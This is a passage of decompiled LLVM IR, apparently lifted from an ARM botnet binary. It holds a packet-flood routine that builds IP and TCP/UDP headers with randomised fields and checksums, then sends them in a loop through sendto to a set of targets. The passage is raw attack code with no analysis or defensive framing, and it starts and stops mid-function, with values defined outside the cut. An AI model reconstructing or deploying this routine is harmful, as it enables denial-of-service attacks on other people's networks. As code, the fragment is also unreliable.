  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v2_abf8 = load i32, i32* @r5, align 4
  %v3_abf8 = add i32 %v2_abf8, 9
  %v4_abf8 = inttoptr i32 %v3_abf8 to i8*
  store i8 %v1_abf8, i8* %v4_abf8, align 1
  store i32 %v6_aa50, i32* %ip.global-to-local, align 4
  %v1_ac00 = load i32, i32* @r5, align 4
  %v2_ac00 = add i32 %v1_ac00, 12
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v6_aa50, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r3.global-to-local, align 4
  %v0_ac08 = load i32, i32* @sb, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r5, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @fp, align 4
  %v1_ac0c = trunc i32 %v0_ac0c to i16
  %v2_ac0c = load i32, i32* @r5, align 4
  %v3_ac0c = add i32 %v2_ac0c, 4
  %v4_ac0c = inttoptr i32 %v3_ac0c to i16*
  store i16 %v1_ac0c, i16* %v4_ac0c, align 2
  %v0_ac10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac10 = load i32, i32* @r5, align 4
  %v2_ac10 = add i32 %v1_ac10, 16
  %v3_ac10 = inttoptr i32 %v2_ac10 to i32*
  store i32 %v0_ac10, i32* %v3_ac10, align 4
  %v0_ac14 = load i32, i32* @r6, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i16
  %v2_ac14 = load i32, i32* @r5, align 4
  %v3_ac14 = add i32 %v2_ac14, 20
  %v4_ac14 = inttoptr i32 %v3_ac14 to i16*
  store i16 %v1_ac14, i16* %v4_ac14, align 2
  %v0_ac18 = load i32, i32* @r5, align 4
  %v1_ac18 = add i32 %v0_ac18, 20
  store i32 %v1_ac18, i32* @r4, align 4
  %v1_ac1c = add i32 %v0_ac18, 32
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %v4_ac1c = zext i8 %v3_ac1c to i32
  store i32 %v4_ac1c, i32* %r3.global-to-local, align 4
  %v1_ac20 = add i32 %v0_ac18, 33
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab28, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_ac1c, 16
  %v1_ac28 = zext i8 %tmp76 to i32
  %v1_ac2c = or i32 %v1_ac28, 80
  store i32 %v1_ac2c, i32* %r3.global-to-local, align 4
  %v1_ac30 = and i32 %v4_ac20, 223
  store i32 %v1_ac30, i32* %r2.global-to-local, align 4
  %v1_ac34 = trunc i32 %v1_ac2c to i8
  store i8 %v1_ac34, i8* %v2_ac1c, align 1
  %v0_ac38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac38 = load i32, i32* %r0.global-to-local, align 4
  %v4_ac38 = mul i32 %v1_ac38, 32
  %v5_ac38 = or i32 %v4_ac38, %v0_ac38
  store i32 %v5_ac38, i32* %r2.global-to-local, align 4
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ac40 = trunc i32 %v5_ac38 to i8
  %v2_ac40 = load i32, i32* @r4, align 4
  %v3_ac40 = add i32 %v2_ac40, 13
  %v4_ac40 = inttoptr i32 %v3_ac40 to i8*
  store i8 %v1_ac40, i8* %v4_ac40, align 1
  %v0_ac44 = load i32, i32* @r4, align 4
  %v1_ac44 = add i32 %v0_ac44, 13
  %v2_ac44 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac44 = load i8, i8* %v2_ac44, align 1
  %v4_ac44 = zext i8 %v3_ac44 to i32
  store i32 %v1_ab2c, i32* %r2.global-to-local, align 4
  %v1_ac4c = and i32 %v4_ac44, 239
  %v5_ac50 = or i32 %v1_ac4c, %v4_ac50
  store i32 %v5_ac50, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac54 = add i32 %v0_ac44, 4
  %v3_ac54 = inttoptr i32 %v2_ac54 to i32*
  store i32 %v0_ac54, i32* %v3_ac54, align 4
  %v0_ac58 = load i32, i32* @sl, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i16
  %v2_ac58 = load i32, i32* @r4, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i16*
  store i16 %v1_ac58, i16* %v4_ac58, align 2
  %v0_ac5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac5c = trunc i32 %v0_ac5c to i8
  %v2_ac5c = load i32, i32* @r4, align 4
  %v3_ac5c = add i32 %v2_ac5c, 13
  %v4_ac5c = inttoptr i32 %v3_ac5c to i8*
  store i8 %v1_ac5c, i8* %v4_ac5c, align 1
  %v0_ac60 = load i32, i32* @r4, align 4
  %v1_ac60 = add i32 %v0_ac60, 13
  %v2_ac60 = inttoptr i32 %v1_ac60 to i8*
  %v3_ac60 = load i8, i8* %v2_ac60, align 1
  %v4_ac60 = zext i8 %v3_ac60 to i32
  store i32 %v1_ab54, i32* %r3.global-to-local, align 4
  %v1_ac68 = and i32 %v4_ac60, 247
  %v5_ac6c = or i32 %v1_ac68, %v4_ac6c
  store i32 %v5_ac6c, i32* %r2.global-to-local, align 4
  %v1_ac70 = trunc i32 %v5_ac6c to i8
  store i8 %v1_ac70, i8* %v2_ac60, align 1
  %v0_ac74 = load i32, i32* @r4, align 4
  %v1_ac74 = add i32 %v0_ac74, 13
  %v2_ac74 = inttoptr i32 %v1_ac74 to i8*
  %v3_ac74 = load i8, i8* %v2_ac74, align 1
  %v4_ac74 = zext i8 %v3_ac74 to i32
  store i32 %v1_ab58, i32* %ip.global-to-local, align 4
  %v1_ac7c = and i32 %v4_ac74, 251
  %v5_ac80 = or i32 %v1_ac7c, %v4_ac80
  store i32 %v5_ac80, i32* %r3.global-to-local, align 4
  %v1_ac84 = trunc i32 %v5_ac80 to i8
  store i8 %v1_ac84, i8* %v2_ac74, align 1
  %v0_ac88 = load i32, i32* @r4, align 4
  %v1_ac88 = add i32 %v0_ac88, 13
  %v2_ac88 = inttoptr i32 %v1_ac88 to i8*
  %v3_ac88 = load i8, i8* %v2_ac88, align 1
  %v4_ac88 = zext i8 %v3_ac88 to i32
  store i32 %v1_ab5c, i32* %r0.global-to-local, align 4
  %v1_ac90 = and i32 %v4_ac88, 253
  %v4_ac94 = or i32 %v1_ac90, %v3_ac94
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  %v1_ac98 = trunc i32 %v4_ac94 to i8
  store i8 %v1_ac98, i8* %v2_ac88, align 1
  %v0_ac9c = load i32, i32* @r4, align 4
  %v1_ac9c = add i32 %v0_ac9c, 13
  %v2_ac9c = inttoptr i32 %v1_ac9c to i8*
  %v3_ac9c = load i8, i8* %v2_ac9c, align 1
  %v4_ac9c = zext i8 %v3_ac9c to i32
  store i32 %v1_ab60, i32* %r1.global-to-local, align 4
  %v1_aca4 = and i32 %v4_ac9c, 254
  %v2_aca8 = or i32 %v1_aca4, %v1_ab60
  store i32 %v2_aca8, i32* %r3.global-to-local, align 4
  %v1_acac = trunc i32 %v2_aca8 to i8
  store i8 %v1_acac, i8* %v2_ac9c, align 1
  %v0_acb0 = call i32 @rand_next()
  %v1_acb0 = trunc i32 %v0_acb0 to i16
  store i32 %v0_acb0, i32* %r0.global-to-local, align 4
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  %v3_acc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_acb8, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_acbc = add i32 %v3_acc4.pre, 13
  %v3_acbc = inttoptr i32 %v2_acbc to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v5_acbc = zext i8 %v4_acbc to i32
  %v2_acc0 = or i32 %v5_acbc, 8
  store i32 %v2_acc0, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_acc4 = add i32 %v3_acc4.pre, 14
  %v5_acc4 = inttoptr i32 %v4_acc4 to i16*
  store i16 %v1_acb0, i16* %v5_acc4, align 2
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v0_accc = load i32, i32* @r5, align 4
  %v1_accc = add i32 %v0_accc, 40
  store i32 %v1_accc, i32* %r0.global-to-local, align 4
  br i1 %v2_acb8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_acd0 = load i32, i32* @r3, align 4
  %v2_acd0 = trunc i32 %v1_acd0 to i8
  %v3_acd0 = load i32, i32* @r4, align 4
  %v4_acd0 = add i32 %v3_acd0, 13
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 %v2_acd0, i8* %v5_acd0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_acd4 = inttoptr i32 %v1_accc to i16*
  %v3_acd4 = call i32 @rand_str(i16* %v2_acd4, i32 %v6_aa14)
  store i32 %v3_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acd8, i32* %r3.global-to-local, align 4
  %v1_acdc = add i32 %v3_acd8, 1
  store i32 %v1_acdc, i32* @r4, align 4
  %v1_ace0 = load i32, i32* @r7, align 4
  %v9_ace0 = icmp eq i32 %v1_acdc, %v1_ace0
  store i1 %v9_ace0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_acdc, i32* %stack_var_-44, align 4
  %v5_ace8 = icmp slt i32 %v1_acdc, %v1_ace0
  br i1 %v5_ace8, label %dec_label_pc_ab84, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %bb70
  store i32 %v6_aa14, i32* %r3.global-to-local, align 4
  %v1_acf0 = add i32 %v6_aa14, 20
  store i32 %v1_acf0, i32* @sb, align 4
  br label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_acec
  %v0_ad108 = phi i32 [ %v1_ace0, %dec_label_pc_acec ], [ 0, %dec_label_pc_af3c ]
  %stack_var_-140.0 = phi i32 [ %v3_aad4, %dec_label_pc_acec ], [ %v3_af48, %dec_label_pc_af3c ]
  %storemerge = add i32 %v6_aa14, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acfc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acfc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acfc, 256
  %v3_ad04 = and i32 %tmp71, 65280
  store i32 %v3_ad04, i32* %r3.global-to-local, align 4
  %v4_ad08 = udiv i32 %v1_acfc, 16777216
  %v5_ad08 = or i32 %v3_ad04, %v4_ad08
  store i32 %v5_ad08, i32* @sl, align 4
  %v9_aea8 = icmp eq i32 %v3_aaac, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  %v2_af0c = icmp eq i32 %v1_aa3c, 0
  %v2_ad48 = icmp eq i32 %v6_aa50, -1
  %v7_ad48 = icmp eq i32 %v6_aa50, -1
  br label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24, %dec_label_pc_acf8
  %v0_ad10 = phi i32 [ %v0_ad108, %dec_label_pc_acf8 ], [ 0, %dec_label_pc_ae24 ], [ 0, %dec_label_pc_ad0c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ad10 = icmp eq i32 %v0_ad10, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_ad1c
  %v1_ad34 = phi i32 [ %v1_ae14, %dec_label_pc_ada0 ], [ 0, %dec_label_pc_ad1c ]
  %v5_ad24 = mul i32 %v1_ad34, 24
  %v1_ad28 = load i32, i32* @r8, align 4
  %v2_ad28 = add i32 %v1_ad28, %v5_ad24
  store i32 %v2_ad28, i32* %r3.global-to-local, align 4
  store i32 %v2_a880, i32* %ip.global-to-local, align 4
  %v1_ad30 = add i32 %v2_ad28, 20
  %v2_ad30 = inttoptr i32 %v1_ad30 to i8*
  %v3_ad30 = load i8, i8* %v2_ad30, align 1
  %v4_ad30 = zext i8 %v3_ad30 to i32
  store i32 %v4_ad30, i32* %r2.global-to-local, align 4
  %v4_ad34 = mul i32 %v1_ad34, 4
  %v5_ad34 = add i32 %v4_ad34, %v2_a880
  %v6_ad34 = inttoptr i32 %v5_ad34 to i32*
  %v7_ad34 = load i32, i32* %v6_ad34, align 4
  store i32 %v7_ad34, i32* @r5, align 4
  %v7_ad38 = icmp eq i8 %v3_ad30, 31
  store i1 %v7_ad38, i1* %cpsr_z.global-to-local, align 1
  %v1_ad3c = add i32 %v7_ad34, 20
  store i32 %v1_ad3c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_ad30, 32
  br i1 %tmp77, label %dec_label_pc_ae38, label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad20
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge, %dec_label_pc_ad50
  %v1_ad68 = phi i32 [ %v1_ad68.pre, %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_ad50 ]
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v9_ad68 = icmp eq i32 %v3_aab0, %v1_ad68
  store i1 %v9_ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad68, label %dec_label_pc_aec8, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge, %dec_label_pc_ad64
  %v1_ad74 = phi i32 [ %v1_ad74.pre, %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge ], [ %v1_ad68, %dec_label_pc_ad64 ]
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v9_ad74 = icmp eq i32 %v3_aab4, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad74, label %dec_label_pc_aedc, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge, %dec_label_pc_ad70
  %v1_ad80 = phi i32 [ %v1_ad80.pre, %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge ], [ %v1_ad74, %dec_label_pc_ad70 ]
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v9_ad80 = icmp eq i32 %v6_a950, %v1_ad80
  store i1 %v9_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad80, label %dec_label_pc_aef0, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge, %dec_label_pc_ad7c
  %v1_ad8c = phi i32 [ %v1_ad8c.pre, %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge ], [ %v1_ad80, %dec_label_pc_ad7c ]
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v9_ad8c = icmp eq i32 %v6_a96c, %v1_ad8c
  store i1 %v9_ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad8c, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_ad94:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04, %dec_label_pc_af18
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ada4 = load i32, i32* @r5, align 4
  %v3_ada4 = add i32 %v2_ada4, 10
  %v4_ada4 = inttoptr i32 %v3_ada4 to i16*
  store i16 0, i16* %v4_ada4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  %v2_adb0 = call i32 @checksum_generic(i32 %v0_adac, i32 20)
  %v3_adb0 = trunc i32 %v2_adb0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_adb8 = load i32, i32* @r5, align 4
  %v4_adb8 = add i32 %v3_adb8, 10
  %v5_adb8 = inttoptr i32 %v4_adb8 to i16*
  store i16 %v3_adb0, i16* %v5_adb8, align 2
  %v0_adbc = load i32, i32* @r6, align 4
  store i32 %v0_adbc, i32* @r1, align 4
  %v0_adc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adc0 to i16
  %v3_adc0 = add i32 %v0_adbc, 16
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* @sl, align 4
  store i32 %v0_adc4, i32* %r2.global-to-local, align 4
  %v0_adc8 = load i32, i32* @sb, align 4
  store i32 %v0_adc8, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  store i32 %v0_adcc, i32* %r0.global-to-local, align 4
  %v4_add0 = call i32 @checksum_tcpudp(i32 %v0_adcc, i32 %v0_adbc, i32 %v0_adc4, i32 %v0_adc8)
  %v5_add0 = trunc i32 %v4_add0 to i16
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  %v3_add4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add4, i32* %r3.global-to-local, align 4
  %v3_add8 = mul i32 %v3_add4, 32
  store i32 %v3_add8, i32* %lr.global-to-local, align 4
  %v3_addc = load i32, i32* @r6, align 4
  %v4_addc = add i32 %v3_addc, 16
  %v5_addc = inttoptr i32 %v4_addc to i16*
  store i16 %v5_add0, i16* %v5_addc, align 2
  %v0_ade0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ade0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ade0, -8
  %v5_ade0 = add i32 %v0_ade0, %tmp78
  store i32 %v5_ade0, i32* %lr.global-to-local, align 4
  %v0_ade4 = load i32, i32* @r6, align 4
  %v1_ade4 = add i32 %v0_ade4, 2
  %v2_ade4 = inttoptr i32 %v1_ade4 to i16*
  %v3_ade4 = load i16, i16* %v2_ade4, align 2
  %v4_ade4 = zext i16 %v3_ade4 to i32
  store i32 %v4_ade4, i32* @r6, align 4
  %v1_ade8 = load i32, i32* @r8, align 4
  %v2_ade8 = add i32 %v1_ade8, %v5_ade0
  store i32 %v2_ade8, i32* @lr, align 4
  %v3_adec = add i32 %v2_ade8, 2
  %v4_adec = inttoptr i32 %v3_adec to i16*
  store i16 %v3_ade4, i16* %v4_adec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @lr, align 4
  %v6_ae0c = call i32 @__libc_sendto(i32 %v3_aa64, i32 %v0_adf8, i32 %v0_ae00, i32 16384, i32 %v0_ae04, i32 16)
  %v3_ae10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = add i32 %v3_ae10, 1
  store i32 %v1_ae14, i32* %r0.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r7, align 4
  %v9_ae18 = icmp eq i32 %v1_ae14, %v1_ae18
  store i1 %v9_ae18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ae14, i32* %stack_var_-44, align 4
  %v5_ae20 = icmp slt i32 %v1_ae14, %v1_ae18
  br i1 %v5_ae20, label %dec_label_pc_ad20, label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_ada0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ae28 = icmp eq i32 %v1_ae18, 0
  store i1 %v2_ae28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ae28, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ad20
  %v1_ae38 = add i32 %v2_ad28, 16
  %v2_ae38 = inttoptr i32 %v1_ae38 to i32*
  %v3_ae38 = load i32, i32* %v2_ae38, align 4
  %v0_ae3c = call i32 @rand_next()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v3_ae40 = load i32, i32* %stack_var_-44, align 4
  %v5_ae48 = mul i32 %v3_ae40, 24
  %v1_ae4c = and i32 %v3_ae38, 16711680
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v3_ae50 = udiv i32 %v3_ae38, 16777216
  %v4_ae54 = udiv i32 %v1_ae4c, 256
  %v5_ae54 = or i32 %v4_ae54, %v3_ae50
  store i32 %v5_ae54, i32* %r2.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r8, align 4
  %v2_ae58 = add i32 %v1_ae58, %v5_ae48
  store i32 %v2_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = and i32 %v3_ae38, 65280
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v2_ae58, 20
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v5_ae68 = call i32 @llvm.bswap.i32(i32 %v3_ae38)
  %v7_ae6c = lshr i32 %v0_ae3c, %v4_ae60
  %v8_ae6c = add i32 %v7_ae6c, %v5_ae68
  store i32 %v8_ae6c, i32* %r2.global-to-local, align 4
  %v1_ae7c = and i32 %v8_ae6c, 65280
  store i32 %v1_ae7c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  %v5_ae88 = call i32 @llvm.bswap.i32(i32 %v8_ae6c)
  store i32 %v5_ae88, i32* %r3.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae90 = load i32, i32* @r5, align 4
  %v2_ae90 = add i32 %v1_ae90, 16
  %v3_ae90 = inttoptr i32 %v2_ae90 to i32*
  store i32 %v5_ae88, i32* %v3_ae90, align 4
  br i1 %v2_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  %v0_ae98 = call i32 @rand_next()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_aea8, i1* %cpsr_z.global-to-local, align 1
  %v1_aeac = load i32, i32* @r5, align 4
  %v2_aeac = add i32 %v1_aeac, 12
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  store i32 %v0_ae98, i32* %v3_aeac, align 4
  br i1 %v9_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge

dec_label_pc_ae98.dec_label_pc_ad64_crit_edge:    ; preds = %dec_label_pc_ae98
  %v1_ad68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad64

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae98, %dec_label_pc_ad50
  %v0_aeb4 = call i32 @rand_next()
  %v1_aeb4 = trunc i32 %v0_aeb4 to i16
  store i32 %v0_aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v3_aab0, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  %v3_aec0 = load i32, i32* @r5, align 4
  %v4_aec0 = add i32 %v3_aec0, 4
  %v5_aec0 = inttoptr i32 %v4_aec0 to i16*
  store i16 %v1_aeb4, i16* %v5_aec0, align 2
  br i1 %v9_aebc, label %dec_label_pc_aec8, label %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge

dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge:    ; preds = %dec_label_pc_aeb4
  %v1_ad74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad70

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4, %dec_label_pc_ad64
  %v0_aec8 = call i32 @rand_next()
  %v1_aec8 = trunc i32 %v0_aec8 to i16
  store i32 %v0_aec8, i32* %r0.global-to-local, align 4
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v1_aed0 = load i32, i32* @r4, align 4
  %v9_aed0 = icmp eq i32 %v3_aab4, %v1_aed0
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  %v3_aed4 = load i32, i32* @r5, align 4
  %v4_aed4 = add i32 %v3_aed4, 20
  %v5_aed4 = inttoptr i32 %v4_aed4 to i16*
  store i16 %v1_aec8, i16* %v5_aed4, align 2
  br i1 %v9_aed0, label %dec_label_pc_aedc, label %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge

dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge:    ; preds = %dec_label_pc_aec8
  %v1_ad80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad7c

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_ad70
  %v0_aedc = call i32 @rand_next()
  %v1_aedc = trunc i32 %v0_aedc to i16
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v1_aee4 = load i32, i32* @r4, align 4
  %v9_aee4 = icmp eq i32 %v6_a950, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  %v3_aee8 = load i32, i32* @r6, align 4
  %v4_aee8 = add i32 %v3_aee8, 2
  %v5_aee8 = inttoptr i32 %v4_aee8 to i16*
  store i16 %v1_aedc, i16* %v5_aee8, align 2
  br i1 %v9_aee4, label %dec_label_pc_aef0, label %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge

dec_label_pc_aedc.dec_label_pc_ad88_crit_edge:    ; preds = %dec_label_pc_aedc
  %v1_ad8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad88

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_ad7c
  %v0_aef0 = call i32 @rand_next()
  %v1_aef4 = load i32, i32* @r6, align 4
  %v2_aef4 = add i32 %v1_aef4, 4
  %v3_aef4 = inttoptr i32 %v2_aef4 to i32*
  store i32 %v0_aef0, i32* %v3_aef4, align 4
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v1_aefc = load i32, i32* @r4, align 4
  %v9_aefc = icmp eq i32 %v6_a96c, %v1_aefc
  store i1 %v9_aefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aefc, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  %v0_af04 = call i32 @rand_next()
  store i32 %v0_af04, i32* %r0.global-to-local, align 4
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_af10 = load i32, i32* @r6, align 4
  %v2_af10 = add i32 %v1_af10, 8
  %v3_af10 = inttoptr i32 %v2_af10 to i32*
  store i32 %v0_af04, i32* %v3_af10, align 4
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04
  %v0_af18 = load i32, i32* @r5, align 4
  %v1_af18 = add i32 %v0_af18, 40
  store i32 %v1_af18, i32* %r0.global-to-local, align 4
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
